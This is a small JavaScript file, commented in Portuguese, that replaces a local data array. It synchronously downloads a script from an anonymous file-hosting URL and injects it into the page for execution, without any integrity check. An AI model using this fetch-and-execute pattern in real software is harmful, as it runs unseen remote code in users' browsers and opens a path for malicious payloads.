/**
 * ARQUIVO: dados.js (Ponte Síncrona para Script Externo)
 * GUIA E PASSO A PASSO PARA O PROGRAMADOR:
 * 1. Função: Este arquivo intercepta a chamada local e baixa o conteúdo do script 
 *    externo de forma síncrona. Isso garante que a variável 'bancoDeDados' esteja 
 *    100% disponível antes que os scripts da página executem a busca.
 * 2. COMO ALTERAR O LINK EXTERNO: Mude o valor da variável 'urlExterna' abaixo 
 *    para o novo link do arquivo .js.
 * 3. COMO VOLTAR A USAR DADOS LOCAIS: Apague todo este código e cole o array 
 *    original de dados (ex: const bancoDeDados = [...]) diretamente aqui.
 */

(function() {
    // URL do arquivo JS externo
    var urlExterna = "https://files.catbox.moe/4r7g84.js";

    // Cria uma requisição HTTP síncrona para bloquear o carregamento até obter o arquivo
    var xhr = new XMLHttpRequest();
    xhr.open('GET', urlExterna, false); // O parâmetro 'false' ativa o modo síncrono

    try {
        xhr.send();
        if (xhr.status === 200) {
            // Cria a tag script e injeta o código-fonte baixado no cabeçalho
            var scriptElement = document.createElement('script');
            scriptElement.text = xhr.responseText;
            document.head.appendChild(scriptElement);
        } else {
            console.error("Erro ao carregar o arquivo externo. Código HTTP: " + xhr.status);
        }
    } catch (erro) {
        console.error("Falha na conexão ao tentar carregar o script externo.", erro);
    }
})();
